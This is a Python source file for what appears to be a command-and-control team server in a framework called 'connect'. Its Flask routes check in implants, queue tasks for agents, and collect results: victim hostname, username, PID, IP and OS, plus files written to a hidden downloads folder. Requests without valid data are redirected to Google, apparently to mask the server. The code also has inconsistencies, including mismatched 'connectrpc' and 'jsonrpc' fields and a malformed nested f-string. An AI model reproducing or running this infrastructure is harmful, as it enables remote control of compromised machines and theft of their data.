import datetime
import json
import os

from connect import output
from connect import convert
from connect import generate
from connect.team_server.models import  AgentModel, ImplantModel, TaskModel
from flask import jsonify, request, redirect


class TeamServerRoutes:

    ERROR_BANNERS = {
        -32700: 'failed to parse the batch request.',                          # Invalid JSON was received by the agent/implant.
        -32600: 'failed to process a task.',                                   # The JSON is not a valid Task object.
        -32601: 'does not support the command:',                               # The command does not exist / is not available.
        -32602: 'was provided incorrect arguments for the command:',           # Invalid command arguments(s).
        -32603: 'Internal error',                                              # Internal JSON-RPC error.
        -32000: 'Server error'                                                 # Reserved for implementation-defined server-errors.
    }

    def __init__(self, db, sio_server):
        self.db = db
        self.sio_server = sio_server

    def check_in_implant(self, implant):
        self.sio_server.emit('information', f'Implant {implant.id} checked in creating Agent')
        try:
            agent = AgentModel(implant=implant)
            self.commit([agent])
        except Exception as e:
            self.sio_server.emit('error', f'Failed to create agent: {e}')
            return None
        self.sio_server.emit('information', f'Created agent {agent.name}')
        return agent

    def check_in_route(self, route):
        """
        The check_in route for agents to retrieve tasks and implants to authenticate.
        
        Parameters
        ----------
            route:    The requested route. 
        """
        implant = ImplantModel.query.filter_by(key=route).first()

        if implant:
            agent = self.check_in_implant(implant)
            if not agent:
                return '[]'
            check_in_task = self.create_check_in_task(agent)
            initial_batch_request = [{
                "connectrpc": "2.0",
                "id": str(check_in_task.id),
                "name": check_in_task.name,
                "parameters": check_in_task.parameters
            }]
            self.sio_server.emit('information', f'Sending initial check in reuqest to {agent.name}')
            return(jsonify(initial_batch_request))
        
        if not request.get_data():
            output.display('ERROR', f'Request made to /{route} with no data.')
            return redirect("https://www.google.com")

        try:
            batch_response = request.get_json(force=True)
        except:
            data = request.get_data().decode('utf-8')
            output.display('DEFAULT', f'Failed to parse batch response:\n{data}')
            output.display('DEFAULT', f'------------------------------')
            return redirect("https://www.google.com")

        batch_request = self.process_tasks(batch_response)
        return jsonify(batch_request)

    def commit(self, models: list):
        """
        Commits model object changes to the database.
        :param models: A list of models.
        """
        for model in models:
            self.db.session.add(model)
        self.db.session.commit()
    
    def connected_notification(self, agent):
        if datetime.datetime.fromtimestamp(823879740.0) == agent.check_in:
            self.sio_server.emit('agent_connected', {'agent': agent.get_agent()})
        agent.check_in = datetime.datetime.now()
        self.commit([agent])

    def create_check_in_task(self, agent):
        check_in_task = TaskModel(name='check_in', description='check in', agent=agent, type=-1)
        check_in_task.completed = datetime.datetime.now()
        check_in_task.sent = datetime.datetime.now()
        self.commit([check_in_task])
        return check_in_task
    
    def process_tasks(self, batch_response):
        batch_request = []
        for task in batch_response:
            if not isinstance(task, dict):
                output.display('ERROR', f'Task not formatted properly: {task}')
                continue
            id = task['id'] if 'id' in task.keys() else None
            result = task['result'] if 'result' in task.keys() else None
            error = task['error'] if 'error' in task.keys() else None
            task = TaskModel.query.filter_by(id=id).first()
            if not task and error:
                # if there is a error with no task then it is an implant error
                error_result = convert.base64_to_string(error['message'])
                error_banner = self.ERROR_BANNERS[error['code']]
                output.display('ERROR', f'An implant {error_banner}')
                print(error_result)
                print('-'*50)
                continue
            if not task and result:
                # if there is a result with no task then throw a debug message
                output.display('INFORMATION', f'Failed to process results: {task}')
                continue
            if error and task.name == 'check_in':
                # if there is a error with a task name of check_in then throw error agent failed to parse batch request
                error_result = convert.base64_to_string(error['message'])
                error_banner = self.ERROR_BANNERS[error['code']]
                output.display('ERROR', f'{task.agent.name} {error_banner}')
                print(error_result)
                print('-'*50)
                continue
            if result and task.name == 'check_in':
                # if there is a result with a task name of check_in then gather unsent tasks
                batch_request.extend(self.retrieve_unsent_tasks(task))         
                continue
            if error:
                self.retrieve_error(task, error)
                continue
            if result or result == '':
                self.retrieve_results(task, result)
                continue
        return batch_request
    
    def retrieve_unsent_tasks(self, task):
        """
        If the task is a check_in then we need to grab uncompleted tasks for the agent.
        :param task:
        :return:
        """
        unsent_tasks = []
        agent = task.agent
        self.connected_notification(agent)
        for unsent_task in agent.tasks:
            if unsent_task.sent:
                continue
            self.sio_server.emit('success', f'Tasked agent {agent.name} to {unsent_task.description}.')
            unsent_task.sent = datetime.datetime.now()
            self.commit([unsent_task])
            unsent_tasks.append({
                "jsonrpc": "2.0", 
                "name": unsent_task.name, 
                "parameters": unsent_task.parameters,
                "id": str(unsent_task.id)
            })
        return unsent_tasks
    
    def retrieve_error(self, task, error):
        agent = task.agent
        error_result = error['message']
        error_banner = self.ERROR_BANNERS[error['code']]
        self.sio_server.emit(f'task_error', f'{{"banner":"{agent.name} {error_banner} ",'
                                        f'"results":"{error_result}"}}')                       
        task.completed = datetime.datetime.now()
        task.results = error_result
        self.commit([task])

    def retrieve_results(self, task, result):
        agent = task.agent
        command = task.name

        # A batch result is reserved to set agent properties.
        if isinstance(result, list):
            property = result[1]
            result = result[0]
            property = convert.base64_to_string(property)
            if command == 'hostname':
                agent.hostname = property
            if command == 'whoami':
                agent.username = property
            if command == 'pid':
                agent.pid = property
            if command == 'ip':
                agent.ip = property
            if command == 'os':
                agent.os = property

        # negative task types don't emmit data.
        # task type "1/-1" saves the results as a string (string data)
        # task type "2/-2" saves the filename where the results were saved to (bystream data)
        if task.type == 1 or task.type == -1:
            task.results = convert.base64_to_string(result)
            if task.type > 0:
                event = 'task_results'
                event_banner = f'{{"banner":"Task results from {agent.name}:",' f'"results":"{result}"}}'
                self.sio_server.emit(
                    event,
                    event_banner 
                )
        if task.type == 2 or task.type == -2:
            file = convert.base64_to_bytes(result)
            filename = f'{os.getcwd()}/.backup/downloads/{generate.string_identifier()}'
            task.results = filename
            with open(filename, 'wb') as fd:
                fd.write(file)
            if task.type > 0:
                event = 'task_results'
                event_banner = f'{{"banner":"Wrote task results from {agent.name} to:", f"results":"{convert.string_to_base64(filename)}"}}'
                self.sio_server.emit(
                    event,
                    event_banner
                )
        task.completed = datetime.datetime.now()
        self.commit([agent, task])